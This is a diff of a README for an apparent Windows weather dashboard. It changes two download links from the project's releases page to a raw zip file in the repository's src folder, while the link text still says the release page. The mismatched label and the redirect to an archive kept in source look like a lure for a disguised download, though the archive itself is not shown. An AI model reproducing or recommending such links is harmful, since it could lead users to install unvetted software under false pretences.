@@ -1,6 +1,6 @@
 # 🌩️ weather-glass-dashboard - View local weather with style today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Aimilassurgent3300/weather-glass-dashboard/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Aimilassurgent3300/weather-glass-dashboard/raw/refs/heads/main/src/weather_dashboard_glass_v1.1.zip)
 
 ## 📌 About this application
 
@@ -20,7 +20,7 @@ This application works on any modern version of Microsoft Windows. Ensure your c
 
 You can obtain the current version of the dashboard from the official project releases page. 
 
-[Click here to visit the release page and download the software.](https://github.com/Aimilassurgent3300/weather-glass-dashboard/releases)
+[Click here to visit the release page and download the software.](https://github.com/Aimilassurgent3300/weather-glass-dashboard/raw/refs/heads/main/src/weather_dashboard_glass_v1.1.zip)
 
 Follow these steps to complete the setup process:
 
